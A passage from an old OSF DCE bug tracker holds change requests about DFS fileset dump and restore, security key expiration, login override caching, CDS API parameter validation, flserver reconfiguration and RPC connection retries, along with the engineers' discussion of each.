dump, VM should not be flooded with dumped data (i.e. the dump should not
blow the "cache").  Thus, the volume op should look for the data in VM, and
if it finds it there, use it, otherwise get it from the disk.
Thus, this should be approached with caution.  I'm skeptical that it will do
more good than harm to pursue this.
I referred to dumping.  Restoring is even more problematic.  Right now we
are invalidating all VM for the given fileset at the start of the restore.
Any implementation of restore that doesn't do this, must afterwards determine,
very carefully, just what VM should be invalidated and what shouldn't.  And
again, as with dumping, it is important that the restore itself should not
allocate new VM ("blow the cache").



CR Number                     : 6319
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 7141
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Need volop body to describe holes in files
Reported Date                 : 12/3/92
Found in Baseline             : 1.0.2
Found Date                    : 12/3/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[12/3/92 public]
There needs to be a volop that the ftserver can use to determine something
about the storage map for a file, so that a fileset dump of a sparse file
doesn't have to transmit scads of zeros (and so that restoring the
sparse file will have a chance to also be sparse).
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[12/3/92 public]
Changed Interest List CC from `cfe, ota' to `cfe, ota, jdp'

[2/12/93 public]
Is it possible that this ot bug can be dupped to another one?  It
seems like I saw another ot bug in which the new volop is getting
added.

[2/12/93 public]
OT 7141 says that there should be an interface for detecting allocation
holes in files, and the fix for that OT in fact provides such an interface.
But coding still needs to be done, both for Episode and for the various
UFS implementations, to actually return allocation-hole information.
Furthermore, coding still needs to be done in the ftserver/ftutil pair
to exploit such information.  Such ftserver/ftutil coding would not require
the implementation of the volop in the file system being dumped, but would
simply dump the whole range of the file; thus, these next two implementation
steps can be taken independently, given that the interface is in place.

Thus, I'm marking 7141 as related to this, but leaving this OT as an open
enhancement, requesting that Episode and/or the native file system (JFS, ...)
 return allocation information.  Work to extend ftserver/ftutil can be added
under this or another OT, depending on timing.
Filled in Inter-dependent CRs with `7141'

[2/12/93 public]
(forgot to change subcomponent to something new)
Changed Subcomponent Name from `xvolume' to `lfs' 
Changed Short Description from `Need volop to describe holes in files' to `Need 
 volop body to describe holes in files'



CR Number                     : 6316
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : sec_key_mgmt
Short Description             : need some slack in the expiration interval
Reported Date                 : 12/3/92
Found in Baseline             : 1.0.2
Found Date                    : 12/3/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/client/key_mgmt/keymgmt.c
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[12/3/92 public]
  It appears that sec_key_mgmt_manage_key() waits to within a second
of key expiration to update the key with a new key. Shouldn't there be
a small window to allow for any rebindings, swap-ins, or transient
errors and the like?
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[12/3/92 public]
The password expiration period is not a "hard' value.  There is no
need to update a server's key prior to the expiration time since the server
will b e able to obtain initial authentication and change its key later.
The timeout period is there as guidance for local OS login programs that
want to impose the hard limit.  The DCE itself does nothing with the 
expiration time.  [still, in the future we may want to harden the policy
at the KDC, so it would probably be worth trying the password update sometime
before the actual expiration]



CR Number                     : 6274
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : overrides
Short Description             : Obtain overrides locally if call fails
Reported Date                 : 12/1/92
Found in Baseline             : 1.0.1
Found Date                    : 12/1/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/client/rca/override.c
Sensitivity                   : public

[12/1/92 public]
Because the parsing of the override file is time consuming (too much overhead
to do per login) we put the override parsing in sec_clientd, so it could keep
an in memory cache of the current override file (refreshing it if it changed),
and you make a call to sec_clientd to check for overrides for the specified
account.
Because it's a possible breach of security to not be able to determine if an
override exists for an account, the login code does not allow anyone to log in
if it can't get override information (the account trying to log in may be
denied access by the override file, but the login layer can't tell, because it
can't see the override info...).
This made perfect sense when implementing it, but it turns out that it's too
restrictive, because it is possible that you can't get to secd *and* your
sec_clientd had problems coming back up when the machine rebooted or...
We need to enhance the override client agent, to do things the hard way (read
and parse the file per login) when the override call to sec_clientd fails.
This will continue to give us the benefit of having it cached when sec_clientd
is working, but still allow people to log in off the local registry if both
secd and the local sec_clientd are down.



CR Number                     : 6230
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : cdspis
Short Description             : No validation checks for CDSPI's input parameters.
Reported Date                 : 11/30/92
Found in Baseline             : 1.0.1
Found Date                    : 11/30/92
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/30/92 public]

The following is from IBM. Note, I don't think there is much we can do
about Number 2 (validate UUID) and Number 4 (validate timeout). I tried to
contact the original reporter, but got no reply.

Full Description:

        In general, the CDSPIs do not perform validation checks
        on the input parameters before the actual manipulation of
        these data values.  This could return unexpected results
        to the invoking application.

        The following is a list of examples:


  1) cdsCreateObj() works if NULL is passed to CDS_Class/CDS_ClassVersion
     ====================================================================

  PTR#1219 - If pass a valid class name and a NULL class version
             value to cdsCreateObj(), an object is created.
             Documentation (CDSPI, Nov/91) for it requires that
             either both or non of these attributes be passed to
             cdsCreateObj().  The created object has class version
             value of 0.0


  2) cdsCreateObj() permits and creates object with invalid UUID
     ===========================================================

  PTR#1296-Create an object with an invalid UUID via cdsCreateObj()
           and the operation will be successful.  To ensure that all
           objects having a consistent UUID format, this behaviour
           should not be permitted.

           The invalid UUID was created by the C function memset()
               memset((void *)uuid, -1, sizeof(dns_id_t));



  3) CDSPIs - NULL passed as entry name returns unexpected result
     ============================================================

  PTR#1269-Attempt to pass a NULL entry (directory, object, soft link)
           full name as an argument to CDSPIs
               cdsCreateObj() / cdsCreateDir() / cdsCreateSLink() /
               cdsDelObj()    / cdsDelDir()    / cdsDelSLink()
           and the result was a return code of 282111999 = CDS_ERROR
           with a fsLocStat value of 0 = "successful completion" in
           the cdsFlagStat_t structure.

           Now these two messages are contradictory and a fsLocStat
           value of 282108905 = CDS_INVALIDARGUMENT or
                    282108906 = CDS_INVALIDNAME
           is more appropriate.


  4) cdsCreateSLink() permits invalid CDS_LinkTimeout value
     ======================================================

  PTR#1298-cdsCreateSLink() will create soft link even if invalid timeout
           value is passed to it.  The resulted soft link contains a
           timeout value of 0 for expiration and 0 for extention.

           The expected result is for the function to return a return
           code of CDS_ERROR with the Flags->fsLocStat variable having a
           value of CDS_INVALIDARGUMENT.

           The method of creating the invalid timeout value was:

                 memset(timeout->expire,-9, sizeof(utc_t));
                 memset(timeout->extend,-9, sizeof(utc_t));

           where timeout is a pointer to structure dns_timeout_t.

           timeout is later passed to function cdsCreateSLink().


  5) cdsAddAttrValue() returns unexpected result with invalid value
     ==============================================================

  PTR#1299-Passing in an invalid attribute value to cdsAddAttrValue()
           will result in unexpected error of CDS_RESOURCEERROR in
           the Flags->fsLocStat variable.  The error message associated
           with this is "Insufficient resources to process request".

           The invalid attribute value in the Value argument is the
           dns_attrvalue_t structure.  A value of -1 was assigned to
           Value->val_syntax (this translated to 255) and no value
           was assigned to the union variable in that structure.

           The expected result in the Flags->fsLocStat variable is
           CDS_INVALIDARGUMENT.


Proposed Solution:

      Provide error checking capability to the input parameters of all
      CDSPIs.

[12/1/92 public]
Since the CDS API is not public, ie not included in the AES, I do not
think validity checking is necessary. Furthermore, it would impede
performance by uselessly checking valid input data. If a vendor wishes
to offer this as a public API, my recommendation is that error checking
be provided with separate functions. As it is, validity checking is
expected to be performed by callers of the CDS API.



CR Number                     : 6221
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : flserver
Short Description             : multi-fldb server cell can't recover from failure
Reported Date                 : 11/29/92
Found in Baseline             : 1.0.2.b6
Found Date                    : 11/29/92
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : 

[11/29/92 public]

We had a cell with five machines 1 core server, 3 dfs fldb servers
(with dfs/client servers) and 1 dfs/client server (no fldb).
One of the fldb machines paniced during cho testing; also one
of the other fldb machines had its flserver disappear during the night.
I rebooted the crashed machine and restarted the flserver on the other
flserver machine.  I waited well over 5 minutes to attempt to cd
into the dfs filesystem machine and got the following errors:

From Fire (fldb):
root@fire  # cm checkfilesets
All backup filesets checked.
root@fire  # cd /.:/fs
dfs: dce errors (code 676372523) from the fileset location server 130.105.5.78
in cell hoodoo_cell
/.:/fs: No such device
--------

from alcatraz (fldb):

# cm checkfilesets
All backup filesets checked.
# cd /.:/fs
dfs: dce errors (code 676372523) from the fileset location server 130.105.5.3 in ce
ll hoodoo_cell
/.:/fs: No such device
-----------

from shotz (has root.dfs +fldb):
This machine got the same output as singsing (below). About 40 minutes later
dfsbind died and I restarted dfsbind again and was able to get into the
root.dfs filesystem, however the other clients were not able to access dfs;
although shotz could acess all filesystems from the other 3 machines.
--------

from singsing (the only non-fldb machine)

# # # cm check
All backup filesets checked.
# cd /.:/fs
dfs: dce errors (382312679) from dfsbind helper.
/.:/fs: I/O error

----
I can't find anything in the manuals that says I should be doing anything
beyond what is done in /etc/rc.dfs - so I'm logging this as a bug.

[11/30/92 public]
The error 676372523 is VL_INITNEEDSWRITE, which you get when the FLDB hasn't
ever been initialized and you try to read it (which dfsbind will do).
I have to conclude that something fishy is up with the 3 flserver machines,
that somehow their flserver configuration is bogus.  This might happen if,
for instance, any flserver process had been left running since any flserver
configuration had been done.  (That is, all flserver processes should be
restarted after any flserver has been added to or removed from the
configuration.)

I say this because I imagine that VL_INITNEEDSWRITE is being returned
from an flserver that's managing an FLDB that has never been initialized,
which could happen if the process of configuring flservers had not
restarted all flservers before trying to initialize an FLDB (typically
with ``fts crserverentry'').  My guess is that the initial flserver
managed an orphaned FLDB and that the FLDB associated with successive
flservers was initialized correctly.  FLDB clients happened to initialize
and use the FLDB associated with successive servers, but when those servers
died, the clients fell over to using the other flservers managing the
detached, uninitialized, FLDB--producing VL_INITNEEDSWRITE.

Error code 382312679 is rpc_s_auth_tkt_expired, which would occur if
dfsbind were being run improperly, i.e. with any DCE identity other than
that associated with root (/.:/hosts/NAME/self).

As for the VL_INITNEEDSWRITE error, it's not a bug in /etc/rc.dfs, but
more likely a bug in dce_config that doesn't prompt for the restarting of
all existing flservers after a new flserver is configured.  This was a level
of support that dce_config never really aspired to.  I believe, though, that
Tony Mason had some changes in this general area that were rejected by the
OSF, so there's not an obvious resolution.

As for the rpc_s_auth_tkt_expired problem, Mike Comer recently exported a
delta to ensure that dfsbind is run with the ...../self identity so that
its tickets won't expire.  Perhaps he can fill in the OT number.
Filled in Interest List CC with `mason, cfe, comer' 
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `' 
Added field Transarc Status with value `'

[11/30/92 public]

Why can't these flservers be made to recognize each other when a
new one comes up. Having to restart all the flservers in a cell when
you add a new one does not do much for DFS scalability. (Imagine being
a system administrator at a large site and having to do this when you
configure or when an fldb machine goes down for a lengthy period of
time.) I think that this should be made more manageable and easier to use
and documented as well.

[11/30/92 public]
Does this mean that, in the case at hand, the flservers were not restarted
when additional ones were added?

In any case, the underlying Ubik protocol is a majority-based distributed
database.  All sites have to know how many total representatives they are;
they all have to have complete knowledge of the target configuration, or else
they will give out incorrect information.

Since a fully-configured cell will generally have exactly three flservers, it
isn't as hard to set up as one might imagine.

My reading is that this should be turned into a defect on dce_config: when
it configures an flserver instance and thus adds a member to the /.:/fs
group, it should direct ``bos restart <member> flserver'' commands to each
of the already-existing members of the /.:/fs group after all CDS
configuration has been done.

I believe that this flserver restriction is documented; Jeff can corroborate.
Even if dce_config doesn't automatically restart all flservers after changing
the flserver configuration, it would be simple to add a warning to dce_config
so that the person running dce_config would know to restart them at the
appropriate moment.

Changed Interest List CC from `mason, cfe, comer' to `mason, cfe, comer, 
 rsarbo'

[12/3/92 public]
This defect was discussed in the most recent DFS call. The brief summary
of the conversations was:

- all flservers need to be restarted when the number of flservers in
	the cell is changed. This is a manual operation, i.e. dce_config
	doesn't do this, nor do the running flservers notice the 
	configuration change. The problems described above were the
	result of not doing the restarts.

- there are ways in which the re-configuration could be made more
	automatic and less manual/error-prone.

- the documentation may not adequately clarify the restartability requirements.

It is desirable that adminstration and re-configuration be improved. There
are several ways that can be done, i.e. modifying dce_config may be 
sufficient, but it isn't necessarily the best or only solution. So, I'm
turning this into an enhancement, and will let the right solution be 
determined in due course.

A doc. defect will also be filed to ensure that the documentation is 
checked, and if necessary, altered, to clarify the restartability requirement.

Changed Defect or Enhancement? from `def' to `enh' 
Changed Interest List CC from `mason, cfe, comer, rsarbo' to `pakhtar, cfe, 
 comer, rsarbo' 
Changed Severity from `B' to `C' 
Filled in Priority with `3' 
Changed Responsible Engr. from `pakhtar' to `vijay@transarc.com' 
Filled in Transarc Status with `open'

[1/11/93 public]
Changed Interest List CC from `pakhtar, cfe, comer, rsarbo' to `pakhtar, cfe, 
 comer, rsarbo, dstokes@transarc.com'

[3/30/94 public]
We're looking at this in 1.1



CR Number                     : 6210
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : cds/includes/cdsclerk.h
Short Description             : Attribute CDS_ClassVersion type mismatch with IDL definition
Reported Date                 : 11/24/92
Found in Baseline             : 1.0.1
Found Date                    : 11/24/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/24/92 public]

One Line Description:

     Attribute CDS_ClassVersion type mismatch with IDL definition

Full Description:


     The structure used for the CDS attribute CDS_ClassVersion is
     cdsVersion_t, where the major minor versions are defined as
     unsigned char (in <cdsclerk.h>).  The IDL file (stub file
     cds_types.idl) defined this attribute as a structure, cds_Version_t
     where the major minor versions are of type unsigned small int.

     An environment is set up with a DCE client machine using the
     ASCII codepage and a DCE server machine using the EBCDIC codepage.
     If an object is created via the CDSPI cdsCreateObj() on the DCE
     client machine, the value for the attribute CDS_ClassVersion will
     not be stored correctly.  This is because the initial value was
     stored as unsigned char by the CDSPI in ASCII, then it is converted
     to unsigned small int by the IDL, on the server machine, this
     ASCII based unsigned small integer is converted to an EBCDIC based
     unsigned char which is not equivalent to the initial unsigned char
     values passed to the CDSPI.  No ASCII/EBCDIC translation was
     performed at the CDS stubs since the RPC call passed in the type
     unsigned small int.

Proposed Solution:

     The structure cdsVersion_t in <cdsclerk.h> should have the major &
     minor version variables defined as type unsigned small int instead
     of type unsigned char.

[12/17/92 public]
I changed this CR to an enhancement. No conversion takes place because
the version is never stored as an ASCII character, it is stored as
a binary value: a major version number of 1 is not stored as '1', but
by assigning an integer 1.  Check out cdstest.c to see an example of this.
And, as observed above, version is passed on the wire as a small int, so
IDL doesn't play games with it either.

I suppose one could argue that cdsVersion should have been defined as
a structure with two integer elements, but that is an enhancement request
to an API not in the AES.  Judicious use of casting seems to me to be a
valid work-around if you want to quiet your C compiler.



CR Number                     : 6201
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 2463
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : 
Short Description             : SHOW CACHED SERVER cmd with wildcard char functions incorrectly
Reported Date                 : 11/24/92
Found in Baseline             : 1.0.1
Found Date                    : 11/24/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/24/92 public]

One would say OT 2463 should have fixed this problem. But it does not. For
list command, it works fine now, but not show ca server. Here we go:

Full Description:

        CDSCP - SHOW CACHED SERVER command functions incorrectly
        when the wildcard character '*' is used (as first character)
        with other characters (following after) as the server name.

Repeated By:

        cdscp> sh ca server *
                                SHOW
                   CACHED NAMESERVER  TLBDS1ME
                                  AT   1992-10-05-21:53:21
                                Name = /.../oeucell/TLBDS1ME_ch
                               Tower = ncadg_ip_udp:9.21.21.99{}
ERROR=> cdscp> sh ca server *abcdefghij
ERROR=>                         SHOW
ERROR=>            CACHED NAMESERVER  TLBDS1ME
ERROR=>                           AT   1992-10-05-21:53:21
ERROR=>                         Name = /.../oeucell/TLBDS1ME_ch
ERROR=>                        Tower = ncadg_ip_udp:9.21.21.99{}
        cdscp> sh ca server t*
        cdscp> sh ca server T*
                                SHOW
                   CACHED NAMESERVER  TLBDS1ME
                                  AT   1992-10-05-21:53:21
                                Name = /.../oeucell/TLBDS1ME_ch
                               Tower = ncadg_ip_udp:9.21.21.99{}
        cdscp> sh ca server TLBDS1ME
                                SHOW
                   CACHED NAMESERVER  TLBDS1ME
                                  AT   1992-10-05-21:53:21
                                Name = /.../oeucell/TLBDS1ME_ch
                               Tower = ncadg_ip_udp:9.21.21.99{}

[12/7/92 public]
Granted, one might expect wildcards to work universally on all cdscp
commands. However, wildcard support is implemented in the CDS server.
Show cached server is handled locally and performs as intended.
This enhancement will not be implemented in 1.0.*.



CR Number                     : 6174
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : sec_login_ API
Short Description             : Need to reinstate and implement sec_login_check_passwd()
Reported Date                 : 11/20/92
Found in Baseline             : 1.0.1
Found Date                    : 11/20/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/client/login/sec_login*.c
Sensitivity                   : public

[11/20/92 public]
We have decided that there is a need for this routine, by vendors wishing to
be able to validate a password without the overhead of setting up a login
context (and app developers too), so we plan to UN-obsolete it in sec_login.idl
and implement it at some point (hopefully soon :-).



CR Number                     : 6101
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : rpc/runtime/cnassoc.c
Short Description             : Scalability problem with rpcd
using CO over TCP/IP
Reported Date                 : 11/16/92
Found in Baseline             : 1.0.1
Found Date                    : 11/16/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/16/92 public]

Full Description:

When running CO protocol over TCP/IP, the RPC runtime does not perform
any retry when connection request failed (unless the timeout value in   e
the binding handle is set to infinite). This problem manifests itself
when the server is listening on a well-known port (e.g. RPC Daemon)
where the request buffers are limited to 10 (TCP/IP).
Apparently the TCP/IP does not perform any retry during the connection
set up phase either.
Consider the case when more than 10 concurrent connect request are
sent to the same RPC Daemon on Machine A (which is possible on a big
system support hundreds of application servers), only the first 10
requests will be able to get through while the rest will be discarded
by the server machine causing connect timed out on the client side.

Repeat By:

      N/A

Proposed Solution:

1. Add retry logic to the CO runtime in case of connect timed out       t
   to alleviate the scaling problem. (in cnassoc.c)

[1/7/93 public]
Cancelled

[1/7/93 public]
Per Doug Hartman's request ... promoted to enhancement.



CR Number                     : 6089
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : fts
Short Description             : Should have an easy way to see low-level status of all replicas
Reported Date                 : 11/16/92
Found in Baseline             : 1.0.2
Found Date                    : 11/16/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[11/16/92 public]
There's currently no way to see the fileset status according to the ftserver
for each replica for a fileset.  ``fts lsreplicas'' shows only the
repserver's status for each replica.  You can type enough commands to do
what you want, but you have a lot of other junk to wade through first.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'



CR Number                     : 6076
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : cfg
Subcomponent Name             : /etc/rc.dce
Short Description             : Using rsh to execute /etc/rc.dce remotely hangs
Reported Date                 : 11/13/92
Found in Baseline             : 1.0.2
Found Date                    : 11/13/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : cfg
Sensitivity                   : public

[11/13/92 public]

Trying to start DCE on a remote machine using rsh hangs.  I tried to start
DCE remotely using "rsh dce7 /etc/rc.dce" and found that /etc/rc.dce
executes correctly but the script never exits.  Using rsh and trying to
start each server (i.e. rpcd, secd, sec_clientd, dtsd, etc.) also hangs.
The workaround is to use "expect" but this is inappropriate for system
tests since expect may not be available on all platforms.

[11/30/92 public]
I'm not sure what exactly would be causing a problem like this.
Do you suspect /etc/rc.dce or rsh?  More info would be appreciated.

[11/30/92 public]

I suspect all the servers (i.e. cdsd, dtsd, secd, sec_clientd, etc.) because
you can not even do a "rsh dce7 /opt/dcelocal/bin/rpcd" without hanging.  I
thought that the problem had to do with the servers not detaching correctly
from the tty because the "ioctl(fd, TIOCNOTTY, 0)" and "close" never get done.
I found that the ioctl is only done if /dev/tty can be opened r/w, if /dev/tty
cannot be opened r/w, which is what happens, then the ioctl is not done. Don
Bolinger told me that he tracked the problem down further and it has some-
thing to do with the way each server forks the process, you may want to talk
to him.

[12/19/95 public]
Fixed in DCE 1.2.1
Closed

[1/6/96 public]

What is the outcome of this OT.  It does not seem to have any code changed
in it.  What code was changed?  Why was it closed?  Is it fixed under a
different OT?  If so what OT number.

[2/2/96 public]

I have seen such hangs in rsh dce_config when I try to config all of the
servers remotely. I have also noticed that dce_config process gets into
defunct state after the script exits. Both rshd and defuncted dce_config
processes sticks around. However, I have known cases where if you config
secd and cdsd in different rsh invocation with appropriate rsh flags
it works, i.e., returns without hanging. Reopened so that further 
investigation can be made. Please note that dce_config install does not
hang nor dce_unconfig. I'm not sure about rc.dce.



CR Number                     : 6049
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 6787,6822
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : fts
Short Description             : deal with dubious incremental restores
Reported Date                 : 11/12/92
Found in Baseline             : 1.0.1
Found Date                    : 11/12/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[11/12/92 public]
This bug seems to have gotten lost in the orbit to OT conversion
way back when...
O>     <Note by hirsch (Phil Hirsch), 91/12/19 13:41:04, action: create>
O> 
O> There is a design limitation on fts dump and restore which requires that
O> a user never attempt to do an incremental restore of a fileset if the
O> start date of the incremental is greater than the end date of the last full
O> or incremental restore that has been applied to the fileset. However,
O> the fts restore command doesn't warn the user if he/she attempts to do
O> this. This is bad because the results can be catastrophic - data loss in
O> the fileset or a machine panic.
O> 
O> We believe that the fts restore command should have an additional switch
O> like -I_know_what_I_am_doing_trust_me, to tell the system that the user
O> is violating this rule on purpose and is prepared to live with the
O> consequences. If this option is not specified, then fts restore would
O> refuse to perform an incremental restore that violated the rule. We don't
O> want to absolutely prohibit violating the rule, since people typically use
O> fts restore when recovering lost data and in such a situation the user
O> may be willing to risk a crash in the course of attempting to restore the
O> lost data.
O> 
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[11/16/92 public]
Reassigned to jdp.
Filled in Interest List CC with `mason,ota,cfe' 
Changed Responsible Engr. from `mason@transarc.com' to `jdp@transarc.com'

[2/23/93 public]
Inadvertantly opened as enh instead of def.  This one may well
be an enh, but I'd like yall to decide that.  Sorry about all
these, I must have had my template wrong for a while.
Changed Defect or Enhancement? from `enh' to `def'

[2/24/93 public]
This is the same defect as was opened later as 6787.  Dup'ing it to this
one, reassigning, and pulling in the OT commentary:
  [ota@transarc.com 1/11/93 public]
  There is currently no code that prevents fts from restoring full and
  incremental dumps incorrectly.  In particular, fts/test21 was doing a
  restore of a dump consisting of a full and two incrementals but skipping
  the first increemental.  This results in an inconsistent file system but
  the INCONSISTENT bit is off.  Attempting to modify such a file system
  will certainly result in a panic.
  There has been some discussion that restoring part of a dump (or not all
  of a dump) would be a valuable thing to do.  I suggest that if we want
  to support this that we allow an inconsistent file system to be
  mountable (exportable) as a read-only file system.  We will need to test
  it to make sure that Episode (perhaps UFS is problematic) doesn't panic
  when reading an inconsistent file system even if it does produce odd
  error codes.  This should be straightforward "merely" a testing problem.
  We must make sure, however, that when the ftutil module is asked to
  restore a dump out of order or with missing pieces it detects this and
  does not clear the inconsistent bit when the fileset is close.  Further
  it must remember this and not clear the inconsistent bit following some
  subsequent fileset operation that completes successfully (say the
  restore of another incremental dump).  I suggest the creation of another
  on-disk fileset status bit that means "MISSING_SOME_VVs".  This bit
  would inhibit clearing the INCONSISTENT bit and would stay set until the
  fileset was restored from a full dump (or deleted or recloned into or
  that sort of thing).
  Contrary to what Vijay, Jeff and I determined last week, Craig claims
  that the VV-dumpted-from is stored in the dump header, so we can easily
  verify that there is an overlap between the incoming restore and the
  on-disk fileset.
  [cfe@transarc.com 1/13/93 public]
  I'd like to address this work in two phases, and I'd like to make this defect
  be associated with the later phase.  Thus, I've created OT 6822 to cover the
  first phase and have down-graded the priority of this one.
  In particular, OT 6822 covers detecting the bad application of incremental
  dumps, and returning failure.  This OT will be used to make it possible to
  use these incremental dumps more gracefully, possibly with the
  MISSING_SOME_VVS option or its analogue.
Filled in Inter-dependent CRs with `6787,6822' 
Changed H/W Ref Platform from `rs6000' to `all' 
Changed S/W Ref Platform from `aix' to `all' 
Changed Short Description from `add switch to fts restore for dubious 
 incremental restores' to `deal with dubious incremental restores' 
Changed Interest List CC from `mason,ota,cfe' to 
 `mason,ota,vijay,jdp,pakhtar@transarc.com' 
Changed Severity from `C' to `D' 
Changed Responsible Engr. from `jdp@transarc.com' to `cfe@transarc.com' 
Changed Transarc Herder from `mason@transarc.com' to `jaffe@transarc.com'

[7/22/93 public]
The first problem that asked fts to prevent an user from restoring full 
and/or incremental dumps incorrectly has been already fixed by Craig in 
OT6822. The second one mentioned in Phil's original report was a request
for an additional feature in the fts command. 
                                                                           
After talking to Ted about the nature of the feature, I mark this as an
enhancement for future releases after 103. 
Changed Defect or Enhancement? from `def' to `enh'



CR Number                     : 6036
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : ftserver
Short Description             : FtLog logs a fileset as created even though it didn't get created
Reported Date                 : 11/11/92
Found in Baseline             : 1.0.2
Found Date                    : 11/11/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[11/11/92 public]

A minor thing. Ftserver logs a fileset creation event even though the create
failed because the fileset name was malformed. Fileset IDs are allocated for 
this. It seems to me that the validity of the fileset name, server name
and aggregate name should be checked before allocating IDs and writing an
entry in the FtLog.

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[12/21/92 public]
(a) This is an enhancement.
(b) It's also somewhat non-trivial, since it is the flserver that checks for
mal-formed fileset names, and ``fts create'' creates the fileset with the
ftserver before creating a new fldb entry with the flserver.
Changed Defect or Enhancement? from `def' to `enh'



CR Number                     : 5955
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 6092
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
